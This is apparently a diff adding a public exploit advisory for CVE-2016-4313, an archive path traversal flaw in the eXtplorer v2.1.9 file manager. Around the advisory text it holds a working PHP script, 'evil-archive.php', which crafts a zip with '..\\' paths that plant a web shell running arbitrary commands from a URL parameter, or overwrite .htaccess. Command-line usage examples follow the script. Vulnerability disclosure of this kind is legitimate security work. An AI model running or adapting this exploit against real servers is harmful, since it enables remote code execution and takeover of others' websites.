@@ -1,0 +1,134 @@
+/*
+[+] Credits: John Page aka hyp3rlinx
+[+] Website: hyp3rlinx.altervista.org
+[+] Source: http://hyp3rlinx.altervista.org/advisories/EXTPLORER-ARCHIVE-PATH-TRAVERSAL.txt
+[+] ISR: apparitionsec
+
+Vendor:
+==============
+extplorer.net
+
+Product:
+==================
+eXtplorer v2.1.9
+
+eXtplorer is a PHP and Javascript-based File Manager, it allows to browse
+directories, edit, copy, move, delete,
+search, upload and download files, create & extract archives, create new
+files and directories, change file
+permissions (chmod) and more. It is often used as FTP extension for popular
+applications like Joomla.
+
+Vulnerability Type:
+======================
+Archive Path Traversal
+
+CVE Reference:
+==============
+CVE-2016-4313
+
+Vulnerability Details:
+=====================
+
+eXtplorer unzip/extract feature allows for path traversal as decompressed
+files can be placed outside of the intended target directory,
+if the archive content contains "../" characters. This can result in files
+like ".htaccess" being overwritten or RCE / back door
+exploits.
+
+
+Tested on Windows
+
+
+Reproduction steps:
+==================
+
+1) Generate an archive using below PHP script
+2) Upload it to eXtplorer and then extract it
+3) Check directory for the default 'RCE.php' file or use CL switch to
+overwrite files like .htaccess
+
+
+Exploit code(s):
+===============
+
+Run below PHP script from CL...
+
+[evil-archive.php]
+*/
+
+<?php
+
+if($argc<4){echo "Usage: <zip name>, <path depth>, <RCE.php as default?
+Y/[file]>";exit();}
+$zipname=$argv[1];
+$exploit_file="RCE.php";
+$cmd='<?php exec($_GET["cmd"]); ?>';
+if(!empty($argv[2])&&is_numeric($argv[2])){
+$depth=$argv[2];
+}else{
+echo "Second flag <path depth> must be numeric!, you supplied '$argv[2]'";
+exit();
+}
+if(strtolower($argv[3])!="y"){
+if(!empty($argv[3])){
+$exploit_file=$argv[3];
+}
+if(!empty($argv[4])){
+$cmd=$argv[4];
+}else{
+echo "Usage: enter a payload for file $exploit_file wrapped in double
+quotes";
+exit();
+}
+}
+$zip = new ZipArchive();
+$res = $zip->open("$zipname.zip", ZipArchive::CREATE);
+$zip->addFromString(str_repeat("..\\", $depth).$exploit_file, $cmd);
+$zip->close();
+echo "\r\nExploit archive $zipname.zip created using $exploit_file\r\n";
+echo "================ by hyp3rlinx ===================";
+?>
+
+/*
+///////////////////////////////////////////////////////////////////////
+
+[Script examples]
+
+Use default RCE.php by passing "y" flag creating DOOM.zip with path depth
+of 2 levels
+c:\>php evil-archive.php  DOOM 2  Y
+
+
+Create DOOM.zip with path depth of 4 levels and .htaccess file to overwrite
+one on the system.
+c:\>php evil-archive.php  DOOM 4  .htaccess  "allow from all"
+
+
+Disclosure Timeline:
+===================================
+Vendor Notification: No reply
+May 14, 2016 : Public Disclosure
+
+Exploitation Method:
+======================
+Local
+
+Severity Level:
+================
+Medium 6.3
+CVSS:3.0/AV:L/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:N
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the
+information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information.
+
+hyp3rlinx
+*/
